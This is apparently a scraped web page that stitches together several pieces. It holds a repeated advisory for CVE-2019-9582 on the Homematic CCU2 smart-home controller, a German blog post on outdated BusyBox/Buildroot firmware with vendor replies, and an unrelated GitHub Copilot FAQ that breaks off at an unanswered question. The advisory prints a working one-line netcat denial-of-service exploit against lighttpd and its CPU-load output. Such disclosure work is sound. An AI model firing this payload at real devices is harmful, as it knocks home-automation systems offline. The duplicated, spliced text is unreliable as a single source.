# Issue Description
The analysis of the underlying operating system of the CCU2 revealed that the BusyBox version 1.20.2 from 2012 with a Buildroot 2012.08 is installed as embedded Linux and that other outdated software packages are also used.
Just to name a few:
```
Buildroot 2012.08
BusyBox: v1.20.2
OpenSSH: 6.0p1
wget: GNU Wget 1.13.4
lighttpd: 1.4.31
Up to CCU2 Firmware < 2.47.10: Java(TM) SE Embedded Runtime Environment (build 1.8.0\_121-b13, profile compact3, headless)
Since CCU2 Firmware >= 2.47.10: Java(TM) SE Embedded Runtime Environment (build 1.8.0\_201-b09, profile compact3, headless)
Tcl Tk: 8.2.3
....
```
After a search for already known CVE entries, the lighttpd process proved to be susceptible because of [CVE-2012-5533](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5533=CVE-2012-5533).

This vulnerability can be exploited by unauthenticated attackers with access to the web interface:
~~~shell
echo -ne "GET / HTTP/1.1\r\nHost: 1.2.3.4\r\nConnection: TC,,Keep-Alive\r\n\r\n" | nc 1.2.3.4 80
~~~
After that the lighttpd is permanently in 99% CPU load and the CCU2 does not react anymore with its ReGa core process because the resources are used up:
```
PID PPID USER STAT VSZ %VSZ %CPU COMMAND
321 1 root R 5548 2% 99% /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
```
Just a restart of lighttpd process seems to be not enough to fix the overload condition, a reboot is required.
There might be much more vulnerabilities, as written in my German [blog post](https://psytester.github.io/embedded\_Linux\_Busybox\_Buildroot/) about outdated embedded Linux Busybox/Buildroot installations.

# Issue Description

The analysis of the underlying operating system of the CCU2 revealed that the BusyBox version 1.20.2 from 2012 with a Buildroot 2012.08 is installed as embedded Linux and that other outdated software packages are also used.

Just to name a few:

```
Buildroot 2012.08
BusyBox: v1.20.2
OpenSSH: 6.0p1
wget: GNU Wget 1.13.4
lighttpd: 1.4.31
Up to CCU2 Firmware < 2.47.10: Java(TM) SE Embedded Runtime Environment (build 1.8.0_121-b13, profile compact3, headless)
Since CCU2 Firmware >= 2.47.10: Java(TM) SE Embedded Runtime Environment (build 1.8.0_201-b09, profile compact3, headless)
Tcl Tk: 8.2.3
....

```

After a search for already known CVE entries, the lighttpd process proved to be susceptible because of [CVE-2012-5533](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5533=CVE-2012-5533).

This vulnerability can be exploited by unauthenticated attackers with access to the web interface:

```
echo -ne "GET / HTTP/1.1\r\nHost: 1.2.3.4\r\nConnection: TC,,Keep-Alive\r\n\r\n" | nc 1.2.3.4 80
```

After that the lighttpd is permanently in 99% CPU load and the CCU2 does not react anymore with its ReGa core process because the resources are used up:

```
PID  PPID USER     STAT   VSZ %VSZ %CPU COMMAND
  321     1 root     R     5548   2%  99% /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf

```

Just a restart of lighttpd process seems to be not enough to fix the overload condition, a reboot is required.

There might be much more vulnerabilities, as written in my German [blog post](https://psytester.github.io/embedded_Linux_Busybox_Buildroot/) about outdated embedded Linux Busybox/Buildroot installations.

# Angriffsvektoren auf aktuelle embedded Linux Busybox/Buildroot Systeme (IoT/Router/Smart Home) wegen Sicherheitslücken in veralteter Softwarebasis

Der initiale Post wurde am 27.06.19 verfasst.

Veraltete Busybox oder Buildroot Versionen können zu einem Problem werden, da diese Sicherheitslücken enthalten.

Heutzutage ist Software Pflege das A und O um nicht verwundbar zu sein.

Die Hersteller sind in guter Gesellschaft, es ist keiner Besser als der andere. Viele setzen teilweise veraltete oder sehr veraltete Versionen als Basis ein!

Wichtig zu wissen: Das Datum in der Versionsausgabe von Busybox ist das Datum der Kompilierung und nicht das Release Datum!

Es gibt alleine 17 CVEs zur Busybox als eigenständiges Produkt:

[Busybox on cvedetails.com](https://www.cvedetails.com/product/7452/Busybox-Busybox.html?vendor_id=4282)

Und es gab weitere Sicherheitsupdates, die nicht explizit als CVE bekannt geworden sind.

Zumindest die bekannten Lücken im DHCP und NTP wären dann eine Angriffsmöglichkeit.

Und die Buildroot in einigen Systemen ist wahrscheinlich noch viel mehr betroffen

[Buildroot changes](https://git.busybox.net/buildroot/plain/CHANGES)

Alle CVEs aufgelistet in den Commits, mit 50 Einträge pro Seite

[Search CVEs in Buildroot commits - page 1](https://git.busybox.net/buildroot/log/?qt=grep&q=CVE)

bis

[Search CVEs in Buildroot commits - page 900](https://git.busybox.net/buildroot/log/?qt=grep&q=CVE&ofs=900)

ergeben Stand heute 2019-06-27 932 Updates wegen Zuordnungen zu CVEs !!!

Bisher habe ich drei Anfragen mit dieser Fragestellung rausgeschickt

```
Ist ihnen die veraltete Busybox/Buildroot „Problematik“ bewusst und gibt es allgemeine Bestrebungen Firmware Releases auf neuerer Basis rauszubringen?
Zumindest die bekannten Lücken im DHCP und NTP wären dann eine Angriffsmöglichkeit.

```

Dazu habe ich diese Antworten erhalten

Anfrage an Utimaco zu deren HSM Se2 Se1500 mit der Firmware FIPS-5.0.10.1, da diese eine BusyBox Installation besitzt.

```
strings /mnt/busybox/bin/busybox |grep "v1."
BusyBox v1.19.4 (2016-03-02 16:57:18 GMT)

```

Die Busybox Version ist wie oben erwähnt nicht vom 2016-03-02, da wurde sie nur kompiliert.

Die Version 1.19.4 wurde am 04.02.2012 Released und ist somit mit nun 7 Jahren deutlich älter (https://www.busybox.net/oldnews.html)

Antwort vom Utimaco Support:

```
Busybox wird nur beim Hochfahren der CSLAN und beim booten in earlyboot benutzt.
Wenn die CSLAN gestartet wird, wird der init-Prozess ausgeführt; dieser mounted die Partitionen und startet das Linux from Scratch Betriebssystem.
Erst durch das LFS-Betriebssystem wird der Netzwerkstack und die benötigten Dienste gestartet.
Busybox wird zu diesem Zeitpunkt nicht mehr benutzt;
Die Busybox Sicherheitslücken sind damit im Betrieb des CryptoServer LAN nicht mehr relevant.

```

Dann möchte ich das mal glauben

Anfrage an eQ-3 zur Homematic CCU2 mit einer BusyBox v1.20.2 aus dem Jahre 2012 & Buildroot 2012.08 und der CCU3 mit einer BusyBox v1.29.2 & Buildroot 2018.08.2. Die CCU3 ist also recht aktuell aus 2018.

Antwort von eQ-3:

```
Hier prüfen wir, welche Teilaspekte wir beheben werden und ob ggf. einzelne Aspekte nicht behoben werden.
Tests bezogen auf neue Versionen von Fremdsoftware sind häufig sehr aufwendig und können teilweise auch zu dem Ergebnis führen, dass eine Interoperabilität mit unseren Softwareanteilen nicht mehr gegeben ist, so dass alternative Lösungen gefunden werden müssen.
Insofern ist die Einschätzung der Umsetzbarkeit/ zeitlichen Umsetzung nicht einfach.

```

Im speziellen zur CCU2 diese Antwort

```
Die Aspekte dieser Schwachstelle, die einen potentiellen Zugriff von außen ermöglichen werden hier priorisiert angegangen. Hier prüfen wir, wie wir das Thema möglichst schnell in den Griff bekommen.

```

Hier muss/wird etwas passieren, siehe [CVE-2019-9582](https://psytester.github.io/CVE-2019-9582/) –> am 09.12.2019 ist es dann passiert. Die Buildroot wurde hochgezogen und ist aktuell sogar neuer als auf einer CCU3.

Anfrage an AVM zu deren Produkten

```
Die FRITZ.Box 7490
    Die Firmware 06.93 enthält die Buildroot 2013.05 und BusyBox 1.22.1 (stable) vom 20 January 2014
    Die Firmware 07.01 bis 7.12 enthalten die Buildroot 2016.05 und BusyBox 1.24.2 (stable) vom 24 March 2016
    Die aktuelle 07.12 Beta/Labor Version vom 19.12.2019 wurde auf die BusyBox v1.29.3 vom 9 September 2018 hochgezogen

Der FRITZ.Box WLAN Repeater 1750E
    Die Firmware 06.93 enthält die Buildroot 2013.05
    Die Firmware 07.01 und 07.10 enthalten die Buildroot 2016.05

```

Antwort vom AVM Support:

```
Vielen Dank für Ihren Hinweis. Bzgl. der von Ihnen angeführten Schwachtstellen im Bereich dhcp und ntp können wir entwarnung geben: Fritz!OS verwendet keine dieser Funktionen aus dem Busybox-Projekt.
Wir nehmen Ihr Schreiben dennoch zum Anlass, die Integration neuerer Busybox-Versionen in künftige FRITZ!OS-Releases zu prüfen.

```

Anhand der 07.12 Beta/Labor Version sieht man, das etwas passiert ist….

(Noch) nicht nachgefragt habe ich bei Netgear zu deren Produkten, aber da wird eingesetzt:

```
R8000 – Nighthawk X6 – AC3200 Tri-Band-Gigabit-WLAN-Router
R8000-V1.0.4.28_10.1.54.zip und auch die R8000-V1.0.4.40_10.1.60_BETA.zip
	BusyBox v1.7.2 --> Releasedatum 10 September 2007 !

NETGEAR Nighthawk Gaming WLAN Router XR700 Pro
XR700-V1.0.1.8.zip
	BusyBox v1.4.2  --> Releasedatum 18 March 2007 !

```

Ist das Wahr? So ein alter Stand?

Beim Schreiben dieses Artikel möchte ich das für die Busybox glauben, habe aber durch die Recherchen zu der Anzahl der CVEs in der Buildroot Zweifel bei den Produkten die auf einen Buildroot Release aufbauen.

Update am 03.12.19:

Mittlerweile habe ich auch die Gateways der KNX Welt aus der Gebäudeautomation entdeckt. Es gibt Gateways verschiedener Markenersteller wie Jung, Gira, Hager, ise, …. um einen KNX Bus ins lokale LAN oder Internet zu bringen, um sie zu steuern. Oder anders herum, um aus der KNX Welt heraus dann Sonos oder Philips HUE Geräte im WLAN zu steuern.

Alle haben sie auch eine Busybox, teilweise von 2012, nutzen z.B. einen veralteten Dropbear SSH 2 Server von 2012, ein socat 2.0.0-b8 von 2015, ein nxing von 2016 oder andere Standard-Software Anteile, die allesamt mit CVEs behaftet sind.

Diese “kleinen” Geräte für den Schaltschrank sind teuer, locker 400 € aufwärts. Das hält mich davon ab, mir aus Spass ein Gateway zu kaufen, nur um es kaputt zu testen.

Meine Analysen sind somit erst mal nur auf theoretischer Basis erstellt und haben aber mind. eine Schwachstelle identifiziert.

Die Antwort aus der KNX Welt eines jetzt noch nicht namentlich erwähnten Herstellers lässt mich hoffen, das mein Anliegen ernst genommen wird:

```
wir bedanken uns ganz herzlich für Ihre mühevolle Arbeit, verbunden mit den wertvollen Informationen, die Sie uns zur Verfügung stellen.
Ihre Recherchen nehmen wir ernst und selbstverständlich zum Anlass für weitere interne Prüfungen.
Diese werden weitere Zeit beanspruchen, wofür wir bereits jetzt auf Ihr Verständnis hoffen, bevor wir Ihnen dazu qualifiziert antworten können.
Wir werden uns unaufgefordert wieder bei Ihnen melden und bedanken uns nochmal abschließend für Ihre Mühen.

```

Die unaufgeforderte Antwort kam dann auch Prompt:

```
vielen Dank für Ihre freundliche, ausführliche und fundierte E-Mail. Erst einmal: Ihre Beobachtungen können wir so bestätigen.
[...]
Da die Produktreleasezyklen in unserem Geschäftsfeld, der Gebäudeautomatisierung, etwas langläufiger sind, [...] Derzeit wird hier an einer neuen Version gearbeitet, die wir in Q2/2020 in den Markt geben werden.
[...]
Nochmals vielen Dank für die ausführliche Analyse und weiterhin viel Erfolg!

```

Aber ansonsten, die Spiele können beginnen und ich bin kein professioneller Pentester…..

Jeder Hersteller hat meiner Meinung nach die Pflicht, seine Produkte auf CVEs zu scannen. Ich tue das ja auch und ja es kostet Zeit und Arbeit, aber es lohnt sich. Für beide Seiten.

Ist die Basis Software besonders alt, ist es deutlich wahrscheinlicher, Schwachstellen zu haben. Damit sind noch nicht die eigenen Applikationen gemeint, es reicht schon das embedded Linux mit seinen Anteilen.

# CVE-2019-9582 eQ-3 Homematic CCU2 outdated base software packages allows Denial of Service

# Overview

* CVE: CVE-2019-9582
* Author: psytester
* Title: eQ-3 Homematic CCU2 outdated base software packages allows Denial of Service
* Vulnerability Type: CWE-400 Uncontrolled Resource Consumption
* CVSSv3 Base Score: 7.5
* CVSSv3 Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
* Publishing Date: 24.07.2019
* Updated: 10.12.2019
* Vendor: eQ-3 AG
* Product: Homematic CCU2
* Vendor contacted: 29.01.2019
* Vendor confirmation: 27.04.2019
* Vendor patch: 2.49.17 since 09.12.2019
* Vendor Reference: [HMCCU-359] in changelog of CCU2
* Affected Firmware version: 2.35.16, 2.41.5, 2.41.8, 2.41.9, 2.45.6, 2.45.7, 2.47.10, 2.47.12, 2.47.15, 2.47.20 tested

# Background

From [vendor’s website](https://www.eq-3.com/products/homematic/control-units-and-gateways/homematic-central-control-unit-ccu2.html):

HomeMatic Central Control Unit CCU2

Homematic Central Control Unit is the central element of your Homematic system, offering a whole range of control, monitoring and configuration options for all the Homematic devices in your installation

[….]

Past [eQ-3 press release](https://www.eq-3.de/aktuelles/newsreader/eq-3-schliesst-sicherheitsluecken-in-der-ccu.html) about taking security updates seriously (in German only):

[…]

eQ-3 ist es wichtig, dass auch solche Lücken geschlossen werden, die für die meisten Installationen keine Rolle spielen.

[…]

Obwohl nur Nutzer betroffen sind, die gegen Sicherheitshinweise von eQ-3 verstoßen oder seit mehreren Jahren keine Sicherheitsupdates installiert haben, gibt eQ-3 solchen Fällen hohe Priorität und behebt entsprechende Sicherheitslücken schnellstmöglich nach Bekanntwerden in neuen Software-Versionen und Hotfixes.

[…]

# Issue Description

The analysis of the underlying operating system of the CCU2 revealed that the BusyBox version 1.20.2 from 2012 with a Buildroot 2012.08 is installed as embedded Linux and that other outdated software packages are also used.

Just to name a few:

```
Buildroot 2012.08
BusyBox: v1.20.2
OpenSSH: 6.0p1
wget: GNU Wget 1.13.4
lighttpd: 1.4.31
Up to CCU2 Firmware < 2.47.10: Java(TM) SE Embedded Runtime Environment (build 1.8.0_121-b13, profile compact3, headless)
Since CCU2 Firmware >= 2.47.10: Java(TM) SE Embedded Runtime Environment (build 1.8.0_201-b09, profile compact3, headless)
Tcl Tk: 8.2.3
....

```

After a search for already known CVE entries, the lighttpd process proved to be susceptible because of [CVE-2012-5533](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5533=CVE-2012-5533).

This vulnerability can be exploited by unauthenticated attackers with access to the web interface:

```
echo -ne "GET / HTTP/1.1\r\nHost: 1.2.3.4\r\nConnection: TC,,Keep-Alive\r\n\r\n" | nc 1.2.3.4 80

```

After that the lighttpd is permanently in 99% CPU load and the CCU2 does not react anymore with its ReGa core process because the resources are used up:

```
PID  PPID USER     STAT   VSZ %VSZ %CPU COMMAND
  321     1 root     R     5548   2%  99% /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf

```

Just a restart of lighttpd process seems to be not enough to fix the overload condition, a reboot is required.

There might be much more vulnerabilities, as written in my German [blog post](https://psytester.github.io/embedded_Linux_Busybox_Buildroot/) about outdated embedded Linux Busybox/Buildroot installations.

# CVE

[CVE-2019-9582](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9582)

# CVSSv3 Base Score

CVSSv3 Base Score: 7.5

CVSSv3 Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

# Base software is updated now since December 2019

10 months later the software is almost up-to-date now and this CVE is fixed.

```
Buildroot: 2019.05
BusyBox: v1.30.1
OpenSSH: 7.9p1
wget: GNU Wget 1.20.3
lighttpd: 1.4.53
java version 1.8.0_201

```

BTW, this is strange but somehow expected. The newer CCU3 hardware has now an older software base line. ;-)

```
Buildroot: 2018.08.2
BusyBox: v1.29.2
OpenSSH: 7.8p1
wget: GNU Wget 1.19.5
lighttpd: 1.4.50

```

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

